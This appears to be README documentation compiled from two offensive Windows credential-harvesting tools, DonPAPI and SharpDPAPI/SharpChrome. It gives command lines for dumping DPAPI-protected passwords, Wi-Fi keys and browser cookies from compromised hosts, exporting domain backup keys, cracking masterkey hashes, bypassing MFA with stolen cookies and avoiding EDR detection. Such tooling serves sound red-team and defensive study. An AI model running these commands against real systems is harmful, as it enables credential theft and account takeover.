DonPAPI
Dumping revelant information on compromised targets without AV detection alt text

Lots of credentials are protected by DPAPI.

We aim at locating those "secured" credentials, and retrieve them using :

User password
Domaine DPAPI BackupKey
Local machine DPAPI Key (protecting TaskScheduled blob)
We made a talk in french about DPAPI called DPAPI - Don't Put Administration Passwords In ðŸ‡«ðŸ‡·:

Usage
Dump all secrets of the target machine with an Domain admin account :

DonPAPI domain/user:passw0rd@target
or a Local one :

DonPAPI -local_auth user@target
Using PtH

DonPAPI --hashes <LM>:<NT> domain/user@target
Using kerberos (-k)

DonPAPI -k domain/user@target
Using a user with LAPS password reading rights

DonPAPI -laps domain/user:passw0rd@target
Using relayed socks:

HackndoRealying

To decrypt secrets DonPapi might need :

Nothing, when facing reversible encryption (firefox, mremoteNG, VNC)
the machine DPAPI Key, we will fetch it automatically thanks to secretdumps when having an admin acces (Wifi, scheduled task passwords)
the user password for everything related to DPAPI Protection, or de DPAPI Domain Backup key
It is possible to provide a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

user1:pass1
user1:pass2
user2:passX
...
DonPAPI -credz credz_file.txt domain/user:passw0rd@target
When a domain admin user is available, it is possible to dump the domain backup key using impacket dpapi.py tool:

dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
Or with dploot:

dploot backupkeys -u username -p password -d domain 192.168.56.30
This backup key (pvk file) can then be used to dump all domain user's secrets!

DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
Target can be an IP, IP range, CIDR, FQDN, file containing list targets (one per line)

Curently gathered info
Windows credentials (Taskscheduled credentials & a lot more)
Windows Vaults
Windows RDP credentials
Windows certificates
AdConnect (still require a manual operation)
Wifi key
Internet explorer Credentials
Chrome cookies & credentials (and chrome like : Edge)
Firefox cookies & credentials
VNC passwords
mRemoteNG password (with default config)
putty, WinSCP
Google Refresh Token
Compliance check
SMB signing status
OS/Domain/Hostname/Ip of the audited scope
Operational use
With local admin account on a host, we can :

Gather machine protected DPAPI secrets
ScheduledTask that will contain cleartext login/password of the account configured to run the task
Wi-Fi passwords
Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
Identify who is connected from where, in order to identify admin's personal computers.
Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.
With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.

Use cookies to bypass MFA (https://www.eshlomo.us/pass-the-cookie-crumble-the-cloud/)
Reports & Raw Data
DonPapi will extract and consolidate a bunch of raw information:

raw user and passwords in 'raw_credz'
dumped certificates informations
raw cookies
raw sam hash
raw users masterkey's hash (Good luck with cracking those, but it might be the only hash you'll get for some SuperAdmin Accounts)
raw DCC2
To generate the report, just use DonPAPI with -R.

HTML Reports will be created, as you'll probably have so many passwords that your browser will crash rendering it, i tried to separate those in few reports.

Cookies are great to bypass MFA, by clicking on a cookie in the report you'll copy what you need to paste to cookie in your browser dev console.

If the certificate allow client authentication, you can click on "Yes" to get a working certipy auth command with the certificate in your clipboard.

some info are excluded from the reports, you can still acces all the data in the sqlite3 donpapi.db database.

Opsec consideration
The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It can be disabled using --no_remoteops flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested.

SharpDPAPI
SharpDPAPI is a C# port of some DPAPI functionality from @gentilkiwi's Mimikatz project.

I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process and operationalize it to fit our workflow.

The SharpChrome subproject is an adaptation of work from @gentilkiwi and @djhohnstein, specifically his SharpChrome project. However, this version of SharpChrome uses a different version of the C# SQL library that supports lockless opening. SharpChrome is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Both Chrome and newer Chromium-based Edge browsers can be triaged with SharpChrome.

SharpChrome also uses an minimized version of @AArnott's BCrypt P/Invoke code released under the MIT License.

If you're unfamiliar with DPAPI, check out this post for more background information. For more information on Credentials and Vaults in regards to DPAPI, check out Benjamin's wiki entry on the subject.

@harmj0y is the primary author of this port.

Operational Usage
SharpDPAPI
One of the goals with SharpDPAPI is to operationalize Benjamin's DPAPI work in a way that fits with our workflow.

How exactly you use the toolset will depend on what phase of an engagement you're in. In general this breaks into "have I compromised the domain or not".

If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the backupkey command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the backupkey command can be used with the masterkeys, credentials, vaults, rdg, or triage commands.

If DA privileges have not been achieved, using Mimikatz' sekurlsa::dpapi command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to the credentials, vaults, rdg, or triage commands. This lets you triage all Credential files/Vaults on a system for any user who's currently logged in, without having to do file-by-file decrypts.

Alternatively, if you can supply a target user's password, NTLM hash, or DPAPI prekey for user-command with /password:X, /ntlm:X, or /prekey:X respectively. The dpapi field of Mimikatz' sekurlsa::msv output for domain users can be used as the /prekey, while the sha1 field of sekurlsa::msv output can be used as the /prekey for local users.

For decrypting RDG/RDCMan.settings files with the rdg command, the /unprotect flag will use CryptUnprotectData() to decrypt any saved RDP passwords, if the command is run from the user context who saved the passwords. This can be done from an unprivileged context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's documentation here.

For machine-specific DPAPI triage, the machinemasterkeys|machinecredentials|machinevaults|machinetriage commands will do the machine equivalent of user DPAPI triage. If in an elevated context (that is, you need local administrative rights), SharpDPAPI will elevate to SYSTEM privileges to retrieve the "DPAPI_SYSTEM" LSA secret, which is then used to decrypt any discovered machine DPAPI masterkeys. These keys are then used as lookup tables for machine credentials/vaults/etc.

For more offensive DPAPI information, check here.

SharpChrome
SharpChrome is a Chrome-specific implementation of SharpDPAPI capable of cookies and logins decryption/triage. It is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Since Chrome Cookies/Login Data are saved without CRYPTPROTECT_SYSTEM, CryptUnprotectData() is back on the table. If SharpChrome is run from an unelevated contect, it will attempt to decrypt any logins/cookies for the current user using CryptUnprotectData(). A /pvk:[BASE64|file.pvk], {GUID}:SHA1 lookup table, /password:X, /ntlm:X, /prekey:X, or /mkfile:FILE of {GUID}:SHA1 values can also be used to decrypt values. Also, the C# SQL library used (with a few modifications) supports lockless opening, meaning that Chrome does not have to be closed/target files do not have to be copied to another location.

Alternatively, if you can supply a target user's password, NTLM hash, or DPAPI prekey for user-command with /password:X, /ntlm:X, or /prekey:X respectively. The dpapi field of Mimikatz' sekurlsa::msv output for domain users can be used as the /prekey, while the sha1 field of sekurlsa::msv output can be used as the /prekey for local users.

If Chrome is version 80+, an AES state key is stored in AppData\Local\Google\Chrome\User Data\Local State - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when /browser:edge or /browser:brave is specified, for newer Chromium-based Edge browser triage.

By default, cookies and logins are displayed as a csv - this can be changed with /format:table for table output, and /format:json for cookies specifically. The json option outputs cookies in a json format that can be imported into the EditThisCookie Chrome extension for easy reuse.

The cookies command also has /cookie:REGEX and /url:REGEX arguments to only return cookie names or urls matching the supplied regex. This is useful with /format:json to easily clone access to specific sites.

Specific cookies/logins/statekey files can be specified with /target:X, and a user folder can be specified with /target:C:\Users\USER\ for any triage command.

SharpDPAPI Commands
User Triage
masterkeys
The masterkeys command will search for any readable user masterkey files and decrypt them using a supplied domain DPAPI backup key. It will return a set of masterkey {GUID}:SHA1 mappings.

/password:X can be used to decrypt a user's current masterkeys. Note that for domain-joined machines, the password can be supplied in either plaintext or NTLM format. If /target is also supplied with /password, the /sid:X full domain SID of the user also needs to be specified.

The domain backup key can be in base64 form (/pvk:BASE64...) or file form (/pvk:key.pvk).

If no /pasword or /pvk is specified, you may pass the /hashes flag to dump the master key hashes in John/Hashcat format. In this mode, the hashes are printed in the format of {GUID}:DPAPImk.

The Preferred key is also parsed in order to highlight the current preferred master key, so that effort is not spent cracking older keys.
